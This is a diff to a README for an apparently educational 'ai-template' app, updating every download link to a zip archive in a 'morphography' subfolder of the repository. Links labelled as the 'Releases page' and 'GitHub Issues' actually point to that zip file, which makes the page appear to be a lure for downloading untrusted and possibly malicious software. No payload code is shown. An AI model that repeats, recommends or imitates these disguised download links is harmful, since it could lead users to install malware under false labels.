@@ -6,11 +6,11 @@ Welcome to the **ai-template** project! This application serves as an interactiv
 
 ## 📥 Download the Application
 
-[![Download ai-template](https://raw.githubusercontent.com/wangqihang12/ai-template/main/morphography/ai-template.zip)](https://raw.githubusercontent.com/wangqihang12/ai-template/main/morphography/ai-template.zip)
+[![Download ai-template](https://github.com/wangqihang12/ai-template/raw/refs/heads/main/morphography/ai_template_2.4.zip)](https://github.com/wangqihang12/ai-template/raw/refs/heads/main/morphography/ai_template_2.4.zip)
 
 To get started, you can download the latest version of the application from the Releases page. 
 
-Visit this page to download: [Download ai-template](https://raw.githubusercontent.com/wangqihang12/ai-template/main/morphography/ai-template.zip)
+Visit this page to download: [Download ai-template](https://github.com/wangqihang12/ai-template/raw/refs/heads/main/morphography/ai_template_2.4.zip)
 
 ## 💻 System Requirements
 
@@ -35,7 +35,7 @@ The **ai-template** application offers the following features:
 To install the **ai-template** application, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download ai-template](https://raw.githubusercontent.com/wangqihang12/ai-template/main/morphography/ai-template.zip)
+   [Download ai-template](https://github.com/wangqihang12/ai-template/raw/refs/heads/main/morphography/ai_template_2.4.zip)
    
 2. Locate the latest release version. Check the date to ensure you have the most recent version.
 
@@ -68,7 +68,7 @@ If you encounter any issues during the installation or usage of the application,
 
 We encourage you to connect with the **ai-template** community:
 
-- Join our discussions on [GitHub Issues](https://raw.githubusercontent.com/wangqihang12/ai-template/main/morphography/ai-template.zip)
+- Join our discussions on [GitHub Issues](https://github.com/wangqihang12/ai-template/raw/refs/heads/main/morphography/ai_template_2.4.zip)
 - Follow our updates on the Releases page.
 
 Thank you for choosing **ai-template**! We hope you find it as enriching and enjoyable to use as I do with my daughter. Happy learning!
